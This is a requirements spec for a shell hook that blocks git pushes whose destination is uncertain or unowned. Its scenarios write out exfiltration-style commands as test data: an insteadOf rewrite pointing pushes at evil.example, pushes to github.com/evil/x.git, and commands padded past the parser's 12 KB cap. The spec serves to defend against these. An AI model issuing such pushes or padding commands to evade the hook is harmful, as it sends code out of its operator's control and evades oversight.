## MODIFIED Requirements

### Requirement: Push shapes the push guard refuses
`guard-push-remote` SHALL block a push whose destination git would pick in a way the guard read as uncertain: a looped push with no explicit remote in a loop the parser reads, a bare push chained after a branch switch or tracking change, a URL with no `owner/repo`, a repository moved by `eval`, `trap` or a `GIT_DIR`/`--git-dir`/`--work-tree` redirect, a push URL rewritten in the same command, more than four push directories or loop remotes, and a push whose remote git cannot resolve.

#### Scenario: Loop with no remote
- **WHEN** the command is `for b in a b; do git push; done`
- **THEN** the hook exits 2 with `git push in loop without explicit remote`

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 2 with `Cannot tell where this push goes`

#### Scenario: No push remote
- **WHEN** a bare `git push` runs in a repository with no `origin` and no configured push remote for the branch
- **THEN** the hook exits 2 with `Cannot resolve push target`

## ADDED Requirements

### Requirement: Pushes in a chain or loop the parser cannot read
`guard-push-remote` MUST NOT block a chain of pushes or a loop holding a push for that alone when the loop parser cannot read the command (past its 12 KB cap, a heredoc or syntax error it cannot parse, or its 1 s parse budget). It SHALL judge each push it can read on its own target, as outside a chain or loop, and a push to a remote the operator does not own SHALL still block.

#### Scenario: Unreadable chain of owned pushes
- **WHEN** a comment takes `git push origin main && git push origin main:feat` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge, not a block

#### Scenario: Unreadable chain with an unowned push
- **WHEN** a comment takes `git push origin main && git push https://github.com/evil/x.git main` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 because the second push targets a remote the operator does not own

#### Scenario: Unreadable loop pushing to an unowned remote
- **WHEN** a comment takes `for b in main feat; do git push https://github.com/evil/x.git $b; done` past 12 KB
- **THEN** the hook exits 2 because the push targets a remote the operator does not own

### Requirement: Nudges for pushes in a chain or loop the parser cannot read
`guard-push-remote` SHALL nudge several pushes in a command the loop parser cannot read, naming the cause (size, a heredoc or syntax error, or parse time) and the action (shorten the command, or run each push as its own command). For a command that holds a loop it SHALL nudge to give every push in the command an explicit remote when a push names no remote or one only the shell resolves (`$r`, a backtick), and SHALL NOT nudge when every push names a literal remote.

#### Scenario: Unreadable chain
- **WHEN** a comment takes `git push origin main && git push origin main:feat` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge whose cause line names the size, a heredoc or syntax error, and the parse time limit, and whose action says to shorten the command or run each push as its own command

#### Scenario: Unreadable loop with a push that names no remote
- **WHEN** a comment takes `for b in a b; do git push; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every push in the command an explicit remote

#### Scenario: Unreadable loop with a push outside it that names no remote
- **WHEN** a comment takes `for b in a b; do git push origin $b; done; git push` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every push in the command an explicit remote

#### Scenario: Unreadable loop of pushes that name a remote
- **WHEN** a comment takes `for b in main feat; do git push origin $b; done` past 12 KB, in an owned checkout
- **THEN** the hook allows with no output
